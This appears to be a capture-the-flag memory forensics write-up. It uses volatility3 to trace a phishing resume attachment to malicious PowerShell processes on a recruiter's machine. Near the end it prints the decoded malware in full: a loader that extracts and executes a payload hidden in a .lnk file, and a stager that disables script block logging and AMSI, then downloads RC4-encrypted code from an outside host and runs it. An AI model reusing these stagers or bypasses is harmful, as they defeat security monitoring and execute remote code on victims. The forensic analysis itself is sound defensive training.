> Suspicious traffic was detected from a recruiter's virtual PC. A memory dump of the offending VM was captured before it was removed from the network for imaging and analysis. Our recruiter mentioned he received an email from someone regarding their resume. A copy of the email was recovered and is provided for reference. Find and decode the source of the malware to find the flag.

1. After analyzing `Resume.eml`, we got that `Resume.zip` was downloaded via `http://10.10.99.55:8080/resume==2Ezip`

2. To extract files from memory dumps, we decided to utilize [volatility3](https://github.com/volatilityfoundation/volatility3). 
    1. Before installation, we need to install some libraries first: `sudo apt install pkg-config libusb-1.0-0-dev`
    2. Run `pip install volatility3` 

3. We run `windows.pslist` and `windows.psscan` to look for any suspicious processes.
   - It is not too helpful, and thus we will try to scan other things.
   - PPID means the parent PID, such as `smss.exe`'s PPID is `4` which that is invoked by `System` process.

```
$ vol -f flounder-pc-memdump.elf windows.pslist
Volatility 3 Framework 2.4.0
Progress:  100.00               PDB scanning finished                                                                                              
PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime        File output

4       0       System  0xfa80006b7040  83      477     N/A     False   2017-10-04 18:04:27.000000      N/A     Disabled
272     4       smss.exe        0xfa8001a63b30  2       30      N/A     False   2017-10-04 18:04:27.000000      N/A     Disabled
348     328     csrss.exe       0xfa800169bb30  9       416     0       False   2017-10-04 18:04:29.000000      N/A     Disabled
376     328     wininit.exe     0xfa8001f63b30  3       77      0       False   2017-10-04 18:04:29.000000      N/A     Disabled
396     384     csrss.exe       0xfa8001efa500  9       283     1       False   2017-10-04 18:04:29.000000      N/A     Disabled
432     384     winlogon.exe    0xfa8001f966d0  4       112     1       False   2017-10-04 18:04:29.000000      N/A     Disabled
476     376     services.exe    0xfa8001fcdb30  11      201     0       False   2017-10-04 18:04:29.000000      N/A     Disabled
492     376     lsass.exe       0xfa8001ff2b30  8       590     0       False   2017-10-04 18:04:30.000000      N/A     Disabled
500     376     lsm.exe 0xfa8001fffb30  11      150     0       False   2017-10-04 18:04:30.000000      N/A     Disabled
600     476     svchost.exe     0xfa8002001b30  12      360     0       False   2017-10-04 18:04:30.000000      N/A     Disabled
664     476     VBoxService.ex  0xfa800209bb30  12      118     0       False   2017-10-04 18:04:30.000000      N/A     Disabled
728     476     svchost.exe     0xfa80020b5b30  7       270     0       False   2017-10-04 18:04:30.000000      N/A     Disabled
792     476     svchost.exe     0xfa80021044a0  21      443     0       False   2017-10-04 18:04:30.000000      N/A     Disabled
868     476     svchost.exe     0xfa8002166b30  21      429     0       False   2017-10-04 18:04:30.000000      N/A     Disabled
900     476     svchost.exe     0xfa800217cb30  41      977     0       False   2017-10-04 18:04:30.000000      N/A     Disabled
988     476     svchost.exe     0xfa80021ccb30  13      286     0       False   2017-10-04 18:04:30.000000      N/A     Disabled
384     476     svchost.exe     0xfa8002204960  17      386     0       False   2017-10-04 18:04:30.000000      N/A     Disabled
1052    476     spoolsv.exe     0xfa8002294b30  13      277     0       False   2017-10-04 18:04:31.000000      N/A     Disabled
1092    476     svchost.exe     0xfa80022bbb30  19      321     0       False   2017-10-04 18:04:31.000000      N/A     Disabled
1196    476     svchost.exe     0xfa8002390620  28      333     0       False   2017-10-04 18:04:31.000000      N/A     Disabled
1720    476     taskhost.exe    0xfa8002245060  8       148     1       False   2017-10-04 18:04:36.000000      N/A     Disabled
1840    476     sppsvc.exe      0xfa8002122060  4       145     0       False   2017-10-04 18:04:37.000000      N/A     Disabled
2020    868     dwm.exe 0xfa80022c8060  4       72      1       False   2017-10-04 18:04:41.000000      N/A     Disabled
2044    2012    explorer.exe    0xfa80020bb630  36      926     1       False   2017-10-04 18:04:41.000000      N/A     Disabled
1476    2044    VBoxTray.exe    0xfa80022622e0  13      146     1       False   2017-10-04 18:04:42.000000      N/A     Disabled
1704    476     SearchIndexer.  0xfa80021b4060  16      734     0       False   2017-10-04 18:04:47.000000      N/A     Disabled
812     1704    SearchFilterHo  0xfa80023ed550  4       92      0       False   2017-10-04 18:04:48.000000      N/A     Disabled
1960    1704    SearchProtocol  0xfa80024f4b30  6       311     0       False   2017-10-04 18:04:48.000000      N/A     Disabled
2812    2044    thunderbird.ex  0xfa80007e0b30  50      534     1       True    2017-10-04 18:06:24.000000      N/A     Disabled
2924    600     WmiPrvSE.exe    0xfa8000801b30  10      204     0       False   2017-10-04 18:06:26.000000      N/A     Disabled
2120    476     svchost.exe     0xfa8000945060  12      335     0       False   2017-10-04 18:06:32.000000      N/A     Disabled
2248    476     wmpnetwk.exe    0xfa800096eb30  18      489     0       False   2017-10-04 18:06:33.000000      N/A     Disabled
592     600     WmiPrvSE.exe    0xfa8000930b30  9       127     0       False   2017-10-04 18:06:35.000000      N/A     Disabled
496     2044    powershell.exe  0xfa800224e060  12      300     1       False   2017-10-04 18:06:58.000000      N/A     Disabled
2772    396     conhost.exe     0xfa8000e90060  2       55      1       False   2017-10-04 18:06:58.000000      N/A     Disabled
2752    496     powershell.exe  0xfa8000839060  20      396     1       False   2017-10-04 18:07:00.000000      N/A     Disabled

```

```
$ vol -f flounder-pc-memdump.elf windows.psscan
Volatility 3 Framework 2.4.0
Progress:  100.00               PDB scanning finished                        
PID     PPID    ImageFileName   Offset(V)       Threads Handles SessionId       Wow64   CreateTime      ExitTime        File output

1960    1704    SearchProtocol  0x1e0f4b30      6       311     0       False   2017-10-04 18:04:48.000000      N/A     Disabled
384     476     svchost.exe     0x1e204960      17      386     0       False   2017-10-04 18:04:30.000000      N/A     Disabled
1720    476     taskhost.exe    0x1e245060      8       148     1       False   2017-10-04 18:04:36.000000      N/A     Disabled
496     2044    powershell.exe  0x1e24e060      12      300     1       False   2017-10-04 18:06:58.000000      N/A     Disabled
1476    2044    VBoxTray.exe    0x1e2622e0      13      146     1       False   2017-10-04 18:04:42.000000      N/A     Disabled
1052    476     spoolsv.exe     0x1e294b30      13      277     0       False   2017-10-04 18:04:31.000000      N/A     Disabled
1092    476     svchost.exe     0x1e2bbb30      19      321     0       False   2017-10-04 18:04:31.000000      N/A     Disabled
2020    868     dwm.exe 0x1e2c8060      4       72      1       False   2017-10-04 18:04:41.000000      N/A     Disabled
1196    476     svchost.exe     0x1e390620      28      333     0       False   2017-10-04 18:04:31.000000      N/A     Disabled
812     1704    SearchFilterHo  0x1e3ed550      4       92      0       False   2017-10-04 18:04:48.000000      N/A     Disabled
600     476     svchost.exe     0x1e401b30      12      360     0       False   2017-10-04 18:04:30.000000      N/A     Disabled
664     476     VBoxService.ex  0x1e49bb30      12      118     0       False   2017-10-04 18:04:30.000000      N/A     Disabled
728     476     svchost.exe     0x1e4b5b30      7       270     0       False   2017-10-04 18:04:30.000000      N/A     Disabled
2044    2012    explorer.exe    0x1e4bb630      36      926     1       False   2017-10-04 18:04:41.000000      N/A     Disabled
792     476     svchost.exe     0x1e5044a0      21      443     0       False   2017-10-04 18:04:30.000000      N/A     Disabled
1840    476     sppsvc.exe      0x1e522060      4       145     0       False   2017-10-04 18:04:37.000000      N/A     Disabled
868     476     svchost.exe     0x1e566b30      21      429     0       False   2017-10-04 18:04:30.000000      N/A     Disabled
900     476     svchost.exe     0x1e57cb30      41      977     0       False   2017-10-04 18:04:30.000000      N/A     Disabled
1704    476     SearchIndexer.  0x1e5b4060      16      734     0       False   2017-10-04 18:04:47.000000      N/A     Disabled
988     476     svchost.exe     0x1e5ccb30      13      286     0       False   2017-10-04 18:04:30.000000      N/A     Disabled
396     384     csrss.exe       0x1e6fa500      9       283     1       False   2017-10-04 18:04:29.000000      N/A     Disabled
376     328     wininit.exe     0x1e763b30      3       77      0       False   2017-10-04 18:04:29.000000      N/A     Disabled
432     384     winlogon.exe    0x1e7966d0      4       112     1       False   2017-10-04 18:04:29.000000      N/A     Disabled
476     376     services.exe    0x1e7cdb30      11      201     0       False   2017-10-04 18:04:29.000000      N/A     Disabled
492     376     lsass.exe       0x1e7f2b30      8       590     0       False   2017-10-04 18:04:30.000000      N/A     Disabled
500     376     lsm.exe 0x1e7ffb30      11      150     0       False   2017-10-04 18:04:30.000000      N/A     Disabled
272     4       smss.exe        0x1ea63b30      2       30      N/A     False   2017-10-04 18:04:27.000000      N/A     Disabled
348     328     csrss.exe       0x1ee9bb30      9       416     0       False   2017-10-04 18:04:29.000000      N/A     Disabled
2772    396     conhost.exe     0x1f690060      2       55      1       False   2017-10-04 18:06:58.000000      N/A     Disabled
2924    600     WmiPrvSE.exe    0x1fc01b30      10      204     0       False   2017-10-04 18:06:26.000000      N/A     Disabled
2752    496     powershell.exe  0x1fc39060      20      396     1       False   2017-10-04 18:07:00.000000      N/A     Disabled
592     600     WmiPrvSE.exe    0x1fd30b30      9       127     0       False   2017-10-04 18:06:35.000000      N/A     Disabled
2120    476     svchost.exe     0x1fd45060      12      335     0       False   2017-10-04 18:06:32.000000      N/A     Disabled
2248    476     wmpnetwk.exe    0x1fd6eb30      18      489     0       False   2017-10-04 18:06:33.000000      N/A     Disabled
2812    2044    thunderbird.ex  0x1fedab30      50      534     1       True    2017-10-04 18:06:24.000000      N/A     Disabled
4       0       System  0x1ffb1040      83      477     N/A     False   2017-10-04 18:04:27.000000      N/A     Disabled
```

- We tried `windows.netscan`

```
 vol -f flounder-pc-memdump.elf windows.netscan
Volatility 3 Framework 2.4.0
Progress:  100.00               PDB scanning finished                        
Offset  Proto   LocalAddr       LocalPort       ForeignAddr     ForeignPort     State   PID     Owner   Created

0x1e069840      UDPv4   10.10.100.43    137     *       0               4       System  2017-10-04 18:04:31.000000 
0x1e06a950      TCPv4   10.10.100.43    139     0.0.0.0 0       LISTENING       4       System  -
0x1e078670      TCPv4   0.0.0.0 5357    0.0.0.0 0       LISTENING       4       System  -
0x1e078670      TCPv6   ::      5357    ::      0       LISTENING       4       System  -
0x1e0a8ec0      UDPv4   0.0.0.0 60655   *       0               1196    svchost.exe     2017-10-04 18:04:31.000000 
0x1e0a8ec0      UDPv6   ::      60655   *       0               1196    svchost.exe     2017-10-04 18:04:31.000000 
0x1e0ac8a0      TCPv4   0.0.0.0 49155   0.0.0.0 0       LISTENING       476     services.exe    -
0x1e0b0a50      UDPv4   0.0.0.0 60654   *       0               1196    svchost.exe     2017-10-04 18:04:31.000000 
0x1e0e08a0      TCPv4   0.0.0.0 445     0.0.0.0 0       LISTENING       4       System  -
0x1e0e08a0      TCPv6   ::      445     ::      0       LISTENING       4       System  -
0x1e0f9010      UDPv4   0.0.0.0 5004    *       0               2248    wmpnetwk.exe    2017-10-04 18:06:34.000000 
0x1e243b20      TCPv4   0.0.0.0 49154   0.0.0.0 0       LISTENING       900     svchost.exe     -
0x1e27f980      TCPv4   0.0.0.0 49154   0.0.0.0 0       LISTENING       900     svchost.exe     -
0x1e27f980      TCPv6   ::      49154   ::      0       LISTENING       900     svchost.exe     -
0x1e28f1a0      UDPv4   0.0.0.0 5005    *       0               2248    wmpnetwk.exe    2017-10-04 18:06:34.000000 
0x1e28f1a0      UDPv6   ::      5005    *       0               2248    wmpnetwk.exe    2017-10-04 18:06:34.000000 
0x1e2ec510      TCPv6   -       0       382b:ff01:80fa:ffff:a010:4502:80fa:ffff 0       CLOSED  384     svchost.exe     N/A
0x1e2f33f0      TCPv4   0.0.0.0 49157   0.0.0.0 0       LISTENING       492     lsass.exe       -
0x1e2fc460      UDPv4   127.0.0.1       54573   *       0               1196    svchost.exe     2017-10-04 18:06:34.000000 
0x1e391b30      TCPv4   0.0.0.0 49155   0.0.0.0 0       LISTENING       476     services.exe    -
0x1e391b30      TCPv6   ::      49155   ::      0       LISTENING       476     services.exe    -
0x1e3c5da0      UDPv4   0.0.0.0 5005    *       0               2248    wmpnetwk.exe    2017-10-04 18:06:34.000000 
0x1e3f7010      UDPv4   0.0.0.0 5355    *       0               384     svchost.exe     2017-10-04 18:04:35.000000 
0x1e3f7010      UDPv6   ::      5355    *       0               384     svchost.exe     2017-10-04 18:04:35.000000 
0x1e3fb010      UDPv4   0.0.0.0 0       *       0               384     svchost.exe     2017-10-04 18:04:33.000000 
0x1e3fb010      UDPv6   ::      0       *       0               384     svchost.exe     2017-10-04 18:04:33.000000 
0x1e47a730      TCPv6   -       0       6890:8300:80fa:ffff:6890:8300:80fa:ffff 0       CLOSED  2752    powershell.exe  -
0x1e4c1e60      TCPv4   0.0.0.0 135     0.0.0.0 0       LISTENING       728     svchost.exe     -
0x1e4c30a0      TCPv4   0.0.0.0 135     0.0.0.0 0       LISTENING       728     svchost.exe     -
0x1e4c30a0      TCPv6   ::      135     ::      0       LISTENING       728     svchost.exe     -
0x1e4d7e70      TCPv4   0.0.0.0 49152   0.0.0.0 0       LISTENING       376     wininit.exe     -
0x1e4d7e70      TCPv6   ::      49152   ::      0       LISTENING       376     wininit.exe     -
0x1e517800      TCPv6   -       0       38cb:1702:80fa:ffff:38cb:1702:80fa:ffff 0       CLOSED  2248    wmpnetwk.exe    N/A
0x1e556820      TCPv4   0.0.0.0 49153   0.0.0.0 0       LISTENING       792     svchost.exe     -
0x1e556820      TCPv6   ::      49153   ::      0       LISTENING       792     svchost.exe     -
0x1e5689e0      TCPv4   0.0.0.0 49153   0.0.0.0 0       LISTENING       792     svchost.exe     -
0x1e5a3250      UDPv4   0.0.0.0 5355    *       0               384     svchost.exe     2017-10-04 18:04:35.000000 
0x1e5cdef0      TCPv4   0.0.0.0 49157   0.0.0.0 0       LISTENING       492     lsass.exe       -
0x1e5cdef0      TCPv6   ::      49157   ::      0       LISTENING       492     lsass.exe       -
0x1e5fa480      UDPv4   127.0.0.1       1900    *       0               1196    svchost.exe     2017-10-04 18:06:34.000000 
0x1e774a60      UDPv4   10.10.100.43    138     *       0               4       System  2017-10-04 18:04:31.000000 
0x1e7d7a60      TCPv6   -       0       6890:8300:80fa:ffff:6890:8300:80fa:ffff 0       CLOSED  2752    powershell.exe  N/A
0x1e85e010      UDPv6   ::1     1900    *       0               1196    svchost.exe     2017-10-04 18:06:34.000000 
0x1e8fb010      UDPv4   0.0.0.0 5004    *       0               2248    wmpnetwk.exe    2017-10-04 18:06:34.000000 
0x1e8fb010      UDPv6   ::      5004    *       0               2248    wmpnetwk.exe    2017-10-04 18:06:34.000000 
0x1e8ff010      UDPv4   10.10.100.43    1900    *       0               1196    svchost.exe     2017-10-04 18:06:34.000000 
0x1e903b10      UDPv6   ::1     54572   *       0               1196    svchost.exe     2017-10-04 18:06:34.000000 
0x1e909010      UDPv4   0.0.0.0 0       *       0               2752    powershell.exe  2017-10-04 18:07:01.000000 
0x1ec304b0      UDPv4   0.0.0.0 3702    *       0               1196    svchost.exe     2017-10-04 18:04:34.000000 
0x1ed592b0      UDPv4   0.0.0.0 3702    *       0               1196    svchost.exe     2017-10-04 18:04:34.000000 
0x1ee7cd20      TCPv4   0.0.0.0 49152   0.0.0.0 0       LISTENING       376     wininit.exe     -
0x1eec14e0      UDPv4   0.0.0.0 3702    *       0               1196    svchost.exe     2017-10-04 18:04:34.000000 
0x1eec14e0      UDPv6   ::      3702    *       0               1196    svchost.exe     2017-10-04 18:04:34.000000 
0x1f1ea4f0      UDPv4   0.0.0.0 3702    *       0               1196    svchost.exe     2017-10-04 18:04:34.000000 
0x1f1ea4f0      UDPv6   ::      3702    *       0               1196    svchost.exe     2017-10-04 18:04:34.000000 
0x1f6c1010      UDPv4   0.0.0.0 0       *       0               2752    powershell.exe  2017-10-04 18:07:01.000000 
0x1f6c1010      UDPv6   ::      0       *       0               2752    powershell.exe  2017-10-04 18:07:01.000000 
0x1f6c2ec0      UDPv4   0.0.0.0 0       *       0               2752    powershell.exe  2017-10-04 18:07:01.000000 
0x1fc04010      TCPv6   -       0       6890:8300:80fa:ffff:6890:8300:80fa:ffff 0       CLOSED  2752    powershell.exe  N/A
0x1fc04490      TCPv4   10.10.100.43    49246   10.10.99.55     80      CLOSED  2752    powershell.exe  -
0x1fc15010      TCPv6   ::1     2869    ::1     49237   ESTABLISHED     4       System  N/A
0x1fc3d320      TCPv4   10.10.100.43    49247   10.10.99.55     80      CLOSED  2752    powershell.exe  -
0x1fc769d0      TCPv4   127.0.0.1       49232   127.0.0.1       49231   ESTABLISHED     2812    thunderbird.ex  N/A
0x1fc76cf0      TCPv4   127.0.0.1       49231   127.0.0.1       49232   ESTABLISHED     2812    thunderbird.ex  N/A
0x1fc85010      UDPv6   fe80::6cee:b5c1:4a75:f04b       1900    *       0               1196    svchost.exe     2017-10-04 18:06:34.000000 
0x1fc8e680      UDPv4   0.0.0.0 0       *       0               2752    powershell.exe  2017-10-04 18:07:01.000000 
0x1fc8e680      UDPv6   ::      0       *       0               2752    powershell.exe  2017-10-04 18:07:01.000000 
0x1fc99db0      TCPv4   0.0.0.0 554     0.0.0.0 0       LISTENING       2248    wmpnetwk.exe    -
0x1fcc2b80      TCPv4   0.0.0.0 2869    0.0.0.0 0       LISTENING       4       System  -
0x1fcc2b80      TCPv6   ::      2869    ::      0       LISTENING       4       System  -
0x1fcc8010      TCPv6   ::1     49237   ::1     2869    ESTABLISHED     2248    wmpnetwk.exe    N/A
0x1fcdbec0      UDPv4   0.0.0.0 0       *       0               664     VBoxService.ex  2017-10-04 18:06:56.000000 
0x1fcf4940      TCPv4   10.10.100.43    49233   10.10.20.166    143     ESTABLISHED     2812    thunderbird.ex  N/A
0x1fd01780      TCPv4   0.0.0.0 10243   0.0.0.0 0       LISTENING       4       System  -
0x1fd01780      TCPv6   ::      10243   ::      0       LISTENING       4       System  -
0x1fd9a3e0      TCPv4   0.0.0.0 554     0.0.0.0 0       LISTENING       2248    wmpnetwk.exe    -
0x1fd9a3e0      TCPv6   ::      554     ::      0       LISTENING       2248    wmpnetwk.exe    -
0x1fdb3630      TCPv4   10.10.100.43    49236   10.10.20.166    143     ESTABLISHED     2812    thunderbird.ex  N/A
```

- We got two suspicious connect to `80` port of `10.10.99.55` where the malicious `resume.pdf` was downloaded.

```
0x1fc04490      TCPv4   10.10.100.43    49246   10.10.99.55     80      CLOSED  2752    powershell.exe  -
0x1fc3d320      TCPv4   10.10.100.43    49247   10.10.99.55     80      CLOSED  2752    powershell.exe  -
```

- Now we run `vol -f flounder-pc-memdump.elf windows.cmdline` to lists process command line arguments.

```
496     powershell.exe  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -win hidden -Ep ByPass $r = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String('JHN0UCwkc2lQPTMyMzAsOTY3NjskZj0ncmVzdW1lLnBkZi5sbmsnO2lmKC1ub3QoVGVzdC1QYXRoICRmKSl7JHg9R2V0LUNoaWxkSXRlbSAtUGF0aCAkZW52OnRlbXAgLUZpbHRlciAkZiAtUmVjdXJzZTtbSU8uRGlyZWN0b3J5XTo6U2V0Q3VycmVudERpcmVjdG9yeSgkeC5EaXJlY3RvcnlOYW1lKTt9JGxuaz1OZXctT2JqZWN0IElPLkZpbGVTdHJlYW0gJGYsJ09wZW4nLCdSZWFkJywnUmVhZFdyaXRlJzskYjY0PU5ldy1PYmplY3QgYnl0ZVtdKCRzaVApOyRsbmsuU2Vlaygkc3RQLFtJTy5TZWVrT3JpZ2luXTo6QmVnaW4pOyRsbmsuUmVhZCgkYjY0LDAsJHNpUCk7JGI2ND1bQ29udmVydF06OkZyb21CYXNlNjRDaGFyQXJyYXkoJGI2NCwwLCRiNjQuTGVuZ3RoKTskc2NCPVtUZXh0LkVuY29kaW5nXTo6VW5pY29kZS5HZXRTdHJpbmcoJGI2NCk7aWV4ICRzY0I7')); iex $r;

2752    powershell.exe  "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -noP -sta -w 1 -enc JABHAHIAbwBVAFAAUABPAEwAaQBDAFkAUwBFAHQAdABJAE4ARwBzACAAPQAgAFsAcgBFAEYAXQAuAEEAUwBzAGUATQBCAEwAWQAuAEcARQB0AFQAeQBwAEUAKAAnAFMAeQBzAHQAZQBtAC4ATQBhAG4AYQBnAGUAbQBlAG4AdAAuAEEAdQB0AG8AbQBhAHQAaQBvAG4ALgBVAHQAaQBsAHMAJwApAC4AIgBHAEUAdABGAEkARQBgAGwAZAAiACgAJwBjAGEAYwBoAGUAZABHAHIAbwB1AHAAUABvAGwAaQBjAHkAUwBlAHQAdABpAG4AZwBzACcALAAgACcATgAnACsAJwBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkALgBHAEUAVABWAGEAbABVAGUAKAAkAG4AdQBsAEwAKQA7ACQARwBSAG8AdQBQAFAATwBsAEkAQwB5AFMAZQBUAFQAaQBOAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCACcAKwAnAGwAbwBjAGsATABvAGcAZwBpAG4AZwAnAF0AIAA9ACAAMAA7ACQARwBSAG8AdQBQAFAATwBMAEkAQwBZAFMARQB0AFQAaQBuAGcAUwBbACcAUwBjAHIAaQBwAHQAQgAnACsAJwBsAG8AYwBrAEwAbwBnAGcAaQBuAGcAJwBdAFsAJwBFAG4AYQBiAGwAZQBTAGMAcgBpAHAAdABCAGwAbwBjAGsASQBuAHYAbwBjAGEAdABpAG8AbgBMAG8AZwBnAGkAbgBnACcAXQAgAD0AIAAwADsAWwBSAGUAZgBdAC4AQQBzAFMAZQBtAEIAbAB5AC4ARwBlAFQAVAB5AFAARQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQB8AD8AewAkAF8AfQB8ACUAewAkAF8ALgBHAEUAdABGAGkAZQBMAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMARQBUAFYAYQBMAHUARQAoACQATgB1AGwATAAsACQAVAByAHUAZQApAH0AOwBbAFMAeQBzAFQAZQBtAC4ATgBlAFQALgBTAEUAcgBWAEkAYwBlAFAATwBJAG4AdABNAEEAbgBBAGcARQBSAF0AOgA6AEUAeABwAEUAYwB0ADEAMAAwAEMATwBuAFQAaQBuAHUARQA9ADAAOwAkAFcAQwA9AE4ARQBXAC0ATwBCAGoARQBjAFQAIABTAHkAcwBUAEUATQAuAE4ARQB0AC4AVwBlAEIAQwBsAEkARQBuAHQAOwAkAHUAPQAnAE0AbwB6AGkAbABsAGEALwA1AC4AMAAgACgAVwBpAG4AZABvAHcAcwAgAE4AVAAgADYALgAxADsAIABXAE8AVwA2ADQAOwAgAFQAcgBpAGQAZQBuAHQALwA3AC4AMAA7ACAAcgB2ADoAMQAxAC4AMAApACAAbABpAGsAZQAgAEcAZQBjAGsAbwAnADsAJAB3AEMALgBIAGUAYQBEAGUAcgBTAC4AQQBkAGQAKAAnAFUAcwBlAHIALQBBAGcAZQBuAHQAJwAsACQAdQApADsAJABXAGMALgBQAFIAbwBYAHkAPQBbAFMAeQBzAFQAZQBNAC4ATgBFAFQALgBXAGUAYgBSAGUAcQB1AEUAcwB0AF0AOgA6AEQAZQBmAGEAVQBMAHQAVwBlAEIAUABSAE8AWABZADsAJAB3AEMALgBQAFIAbwBYAFkALgBDAFIARQBEAGUATgB0AEkAYQBMAFMAIAA9ACAAWwBTAFkAUwBUAGUATQAuAE4ARQBUAC4AQwByAGUARABFAG4AVABpAGEATABDAGEAQwBoAGUAXQA6ADoARABlAEYAYQB1AEwAVABOAEUAdAB3AE8AcgBrAEMAcgBlAGQAZQBuAHQAaQBBAGwAUwA7ACQASwA9AFsAUwBZAFMAdABFAE0ALgBUAGUAeAB0AC4ARQBOAEMATwBEAEkAbgBnAF0AOgA6AEEAUwBDAEkASQAuAEcARQB0AEIAeQB0AEUAcwAoACcARQAxAGcATQBHAGQAZgBUAEAAZQBvAE4APgB4ADkAewBdADIARgA3ACsAYgBzAE8AbgA0AC8AUwBpAFEAcgB3ACcAKQA7ACQAUgA9AHsAJABEACwAJABLAD0AJABBAHIAZwBTADsAJABTAD0AMAAuAC4AMgA1ADUAOwAwAC4ALgAyADUANQB8ACUAewAkAEoAPQAoACQASgArACQAUwBbACQAXwBdACsAJABLAFsAJABfACUAJABLAC4AQwBvAHUAbgBUAF0AKQAlADIANQA2ADsAJABTAFsAJABfAF0ALAAkAFMAWwAkAEoAXQA9ACQAUwBbACQASgBdACwAJABTAFsAJABfAF0AfQA7ACQARAB8ACUAewAkAEkAPQAoACQASQArADEAKQAlADIANQA2ADsAJABIAD0AKAAkAEgAKwAkAFMAWwAkAEkAXQApACUAMgA1ADYAOwAkAFMAWwAkAEkAXQAsACQAUwBbACQASABdAD0AJABTAFsAJABIAF0ALAAkAFMAWwAkAEkAXQA7ACQAXwAtAGIAeABvAFIAJABTAFsAKAAkAFMAWwAkAEkAXQArACQAUwBbACQASABdACkAJQAyADUANgBdAH0AfQA7ACQAdwBjAC4ASABFAEEAZABFAHIAcwAuAEEARABEACgAIgBDAG8AbwBrAGkAZQAiACwAIgBzAGUAcwBzAGkAbwBuAD0ATQBDAGEAaAB1AFEAVgBmAHoAMAB5AE0ANgBWAEIAZQA4AGYAegBWADkAdAA5AGoAbwBtAG8APQAiACkAOwAkAHMAZQByAD0AJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADkAOQAuADUANQA6ADgAMAAnADsAJAB0AD0AJwAvAGwAbwBnAGkAbgAvAHAAcgBvAGMAZQBzAHMALgBwAGgAcAAnADsAJABmAGwAYQBnAD0AJwBIAFQAQgB7ACQAXwBqADAARwBfAHkAMAB1AFIAXwBNADMAbQAwAHIAWQBfACQAfQAnADsAJABEAGEAdABBAD0AJABXAEMALgBEAG8AVwBOAEwAbwBhAEQARABBAFQAQQAoACQAUwBlAFIAKwAkAHQAKQA7ACQAaQB2AD0AJABkAGEAVABBAFsAMAAuAC4AMwBdADsAJABEAEEAdABhAD0AJABEAGEAVABhAFsANAAuAC4AJABEAEEAdABhAC4ATABlAG4ARwBUAEgAXQA7AC0ASgBPAEkATgBbAEMASABBAHIAWwBdAF0AKAAmACAAJABSACAAJABkAGEAdABBACAAKAAkAEkAVgArACQASwApACkAfABJAEUAWAA=
```

- We put these base64 string to [CyberChef](https://gchq.github.io/CyberChef/)
  - For the second base64 string, we used `UTF-16LE` to decode powershell command after base64 decoding.

```powershell
$stP,$siP=3230,9676;$f='resume.pdf.lnk';if(-not(Test-Path $f)){$x=Get-ChildItem -Path $env:temp -Filter $f -Recurse;[IO.Directory]::SetCurrentDirectory($x.DirectoryName);}$lnk=New-Object IO.FileStream $f,'Open','Read','ReadWrite';$b64=New-Object byte[]($siP);$lnk.Seek($stP,[IO.SeekOrigin]::Begin);$lnk.Read($b64,0,$siP);$b64=[Convert]::FromBase64CharArray($b64,0,$b64.Length);$scB=[Text.Encoding]::Unicode.GetString($b64);iex $scB;
```

```powershell
$GroUPPOLiCYSEttINGs = [rEF].ASseMBLY.GEtTypE('System.Management.Automation.Utils')."GEtFIE`ld"('cachedGroupPolicySettings', 'N'+'onPublic,Static').GETValUe($nulL);$GRouPPOlICySeTTiNgS['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0;$GRouPPOLICYSEtTingS['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0;[Ref].AsSemBly.GeTTyPE('System.Management.Automation.AmsiUtils')|?{$_}|%{$_.GEtFieLd('amsiInitFailed','NonPublic,Static').SETVaLuE($NulL,$True)};[SysTem.NeT.SErVIcePOIntMAnAgER]::ExpEct100COnTinuE=0;$WC=NEW-OBjEcT SysTEM.NEt.WeBClIEnt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeaDerS.Add('User-Agent',$u);$Wc.PRoXy=[SysTeM.NET.WebRequEst]::DefaULtWeBPROXY;$wC.PRoXY.CREDeNtIaLS = [SYSTeM.NET.CreDEnTiaLCaChe]::DeFauLTNEtwOrkCredentiAlS;$K=[SYStEM.Text.ENCODIng]::ASCII.GEtBytEs('E1gMGdfT@eoN>x9{]2F7+bsOn4/SiQrw');$R={$D,$K=$ArgS;$S=0..255;0..255|%{$J=($J+$S[$_]+$K[$_%$K.CounT])%256;$S[$_],$S[$J]=$S[$J],$S[$_]};$D|%{$I=($I+1)%256;$H=($H+$S[$I])%256;$S[$I],$S[$H]=$S[$H],$S[$I];$_-bxoR$S[($S[$I]+$S[$H])%256]}};$wc.HEAdErs.ADD("Cookie","session=MCahuQVfz0yM6VBe8fzV9t9jomo=");$ser='http://10.10.99.55:80';$t='/login/process.php';$flag='HTB{$_j0G_y0uR_M3m0rY_$}';$DatA=$WC.DoWNLoaDDATA($SeR+$t);$iv=$daTA[0..3];$DAta=$DaTa[4..$DAta.LenGTH];-JOIN[CHAr[]](& $R $datA ($IV+$K))|IEX
```